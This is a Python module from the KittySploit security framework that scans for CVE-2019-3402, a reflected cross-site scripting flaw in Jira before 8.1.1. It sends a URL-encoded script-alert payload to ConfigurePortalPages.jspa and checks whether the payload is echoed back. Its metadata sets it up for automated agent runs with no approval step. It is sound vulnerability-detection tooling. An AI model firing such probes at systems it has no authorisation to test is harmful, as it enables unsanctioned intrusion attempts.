#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jira before 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jira < 8.1.1 - Cross-Site Scripting Detection',
        'description': 'Jira before 8.1.1 contains a cross-site scripting vulnerability via ConfigurePortalPages.jspa resource in the searchOwnerUserName parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'atlassian', 'jira', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://gist.github.com/0x240x23elu/891371d46a1e270c7bdded0469d8e09c',
            'https://jira.atlassian.com/browse/JRASERVER-69243',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-3402',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/Faizee-Asad/JIRA-Vulnerabilities',
        ],
        'cve': 'CVE-2019-3402',
    }

    def run(self):
        r = self.http_request(method="GET", path='/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("'<script>alert(1)</script>' does not exist",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Jira < 8.1.1 - Cross-Site Scripting detected",
                path='/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search',
            )
            return True
        return False

